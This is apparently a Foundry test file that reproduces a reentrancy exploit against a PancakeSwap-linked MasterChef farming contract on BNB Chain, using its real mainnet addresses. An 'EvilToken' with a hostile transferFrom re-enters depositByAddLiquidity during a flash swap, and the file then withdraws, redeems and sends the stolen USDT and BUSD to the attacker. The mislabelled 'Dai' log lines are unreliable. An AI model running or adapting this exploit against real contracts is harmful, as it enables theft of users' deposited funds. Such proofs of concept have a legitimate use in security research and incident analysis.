// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./interfaces/PancakeSwap/IERC20.sol";
import "./interfaces/PancakeSwap/IPancakePair.sol";


interface IMasterChef {
  event Deposit(address indexed user, uint256 indexed pid, uint256 amount);
  event EmergencyWithdraw(
    address indexed user,
    uint256 indexed pid,
    uint256 amount
  );
  event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
  event WithdrawChange(
    address indexed user,
    address indexed token,
    uint256 change
  );

  function BONUS_MULTIPLIER() external view returns (uint256);

  function WETH() external view returns (address);

  function _become(address proxy) external;

  function _totalClaimed(address, uint256) external view returns (uint256);

  function _whitelist(address) external view returns (address);

  function add(
    uint256 _allocPoint,
    address _lpToken,
    uint256 _pooltype,
    address _ticket,
    bool _withUpdate
  ) external;

  function admin() external view returns (address);

  function bonusEndBlock() external view returns (uint256);

  function check_vip_limit(
    uint256 ticket_level,
    uint256 ticket_count,
    uint256 amount
  ) external view returns (uint256 allowed, uint256 overflow);

  function claimFeeRate() external view returns (uint256);

  function deposit(uint256 _pid, uint256 _amount) external;

  function depositByAddLiquidity(
    uint256 _pid,
    address[2] memory _tokens,
    uint256[2] memory _amounts
  ) external;

  function depositByAddLiquidityETH(
    uint256 _pid,
    address _token,
    uint256 _amount
  ) external payable;

  function depositSingle(
    uint256 _pid,
    address _token,
    uint256 _amount,
    address[][2] memory paths,
    uint256 _minTokens
  ) external payable;

  function depositSingleTo(
    address _user,
    uint256 _pid,
    address _token,
    uint256 _amount,
    address[][2] memory paths,
    uint256 _minTokens
  ) external payable;

  function depositTo(
    uint256 _pid,
    uint256 _amount,
    address _user
  ) external;

  function deposit_all_tickets(address ticket) external;

  function dev(address _devaddr) external;

  function devaddr() external view returns (address);

  function emergencyWithdraw(uint256 _pid) external;

  function farmPercent(uint256) external view returns (uint8);

  function feeDistributor() external view returns (address);

  function getMultiplier(uint256 _from, uint256 _to)
  external
  view
  returns (uint256);

  function implementation() external view returns (address);

  function initialize(
    address _t42,
    address _treasury,
    address _feeDistributor,
    address _devaddr,
    uint256 _bonusEndBlock,
    address _WETH,
    address _paraRouter
  ) external;

  function massUpdatePools() external;

  function migrate(uint256 _pid) external;

  function migrator() external view returns (address);

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) external returns (bytes4);

  function paraRouter() external view returns (address);

  function pendingAdmin() external view returns (address);

  function pendingImplementation() external view returns (address);

  function pendingT42(uint256 _pid, address _user)
  external
  view
  returns (uint256 pending, uint256 fee);

  function poolInfo(uint256)
  external
  view
  returns (
    address lpToken,
    uint256 allocPoint,
    uint256 lastRewardBlock,
    uint256 accT42PerShare,
    address ticket,
    uint256 pooltype
  );

  function poolLength() external view returns (uint256);

  function poolsTotalDeposit(uint256) external view returns (uint256);

  function set(
    uint256 _pid,
    uint256 _allocPoint,
    bool _withUpdate
  ) external;

  function setClaimFeeRate(uint256 newRate) external;

  function setFarmPercents(uint8[] memory percents) external;

  function setFeeDistributor(address _newAddress) external;

  function setMigrator(address _migrator) external;

  function setRouter(address _router) external;

  function setT42(address _t42) external;

  function setTreasury(address _treasury) external;

  function setWhitelist(address _whtie, address accpeter) external;

  function setWithdrawFeeRate(uint256 newRate) external;

  function startBlock() external view returns (uint256);

  function t42() external view returns (address);

  function t42PerBlock(uint8 index) external view returns (uint256);

  function ticket_staked_array(address who, address ticket)
  external
  view
  returns (uint256[] memory);

  function ticket_staked_count(address who, address ticket)
  external
  view
  returns (uint256);

  function ticket_stakes(
    address,
    address,
    uint256
  ) external view returns (uint256);

  function totalAllocPoint() external view returns (uint256);

  function totalClaimed(
    address _user,
    uint256 pooltype,
    uint256 index
  ) external view returns (uint256);

  function treasury() external view returns (address);

  function updatePool(uint256 _pid) external;

  function userChange(address, address) external view returns (uint256);

  function userInfo(uint256, address)
  external
  view
  returns (uint256 amount, uint256 rewardDebt);

  function withdraw(uint256 _pid, uint256 _amount) external;

  function withdrawAndRemoveLiquidity(
    uint256 _pid,
    uint256 _amount,
    bool isBNB
  ) external;

  function withdrawChange(address[] memory tokens) external;

  function withdrawFeeRate() external view returns (uint256);

  function withdrawSingle(
    address tokenOut,
    uint256 _pid,
    uint256 _amount,
    address[][2] memory paths
  ) external;

  function withdraw_tickets(uint256 _pid, uint256 tokenId) external;
}

contract EvilToken {
  IMasterChef masterchef;
  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

  constructor(IMasterChef _masterchef) {
    masterchef = _masterchef;
  }

  function allowance(address owner, address spender)
    external
    view
    returns (uint256)
  {
    return 2**256 - 1;
  }

  function balanceOf(address account) external view returns (uint256) {
    return 1111;
  }

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool) {
    if (
      address(masterchef) != address(0) &&
      address(msg.sender) != address(masterchef)
    ) {
      usdt.approve(address(masterchef), 2**256 - 1);
      busd.approve(address(masterchef), 2**256 - 1);
      masterchef.depositByAddLiquidity(
        18,
        [address(usdt), address(busd)],
        [usdt.balanceOf(address(this)), busd.balanceOf(address(this))]
      );
    }
    return true;
  }

  function redeem() external {
    (uint256 _amount, ) = masterchef.userInfo(18, address(this));
    masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
    usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
    busd.transfer(msg.sender, busd.balanceOf(address(this)));
  }
}

contract ContractTest is Test {
  IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
  IERC20 usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  IMasterChef masterchef =
    IMasterChef(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);
  EvilToken token0;
  EvilToken token1;

  

  function testExploit() public {
    token0 = new EvilToken(IMasterChef(address(0)));
    token1 = new EvilToken(masterchef);
    pair.swap(10000 * 1e18, 10000 * 1e18, address(this), new bytes(1));
    emit log_named_uint(
      "Before exploit, Dai balance of attacker:",
      usdt.balanceOf(msg.sender)
    );
    emit log_named_uint(
      "After exploit, Dai balance of attacker:",
      busd.balanceOf(msg.sender)
    );

    //iWithdraw.processExits(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    //  emit log_named_uint("After exploit, Dai balance of attacker:",idai.balanceOf(msg.sender));
  }

  function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
  ) public {
    usdt.transfer(address(token1), usdt.balanceOf(address(this)));
    busd.transfer(address(token1), busd.balanceOf(address(this)));
    masterchef.depositByAddLiquidity(
      18,
      [address(token0), address(token1)],
      [uint256(1), uint256(1)]
    );
    (uint256 _amount, ) = masterchef.userInfo(18, address(this));
    masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
    address[] memory t = new address[](2);
    t[0] = address(busd);
    t[1] = address(usdt);
    masterchef.withdrawChange(t);
    token1.redeem();
    usdt.transfer(msg.sender, ((amount0 / 9975) * 10000) + 10000);
    busd.transfer(msg.sender, ((amount1 / 9975) * 10000) + 10000);
    usdt.transfer(tx.origin, usdt.balanceOf(address(this)));
    busd.transfer(tx.origin, busd.balanceOf(address(this)));
  }
}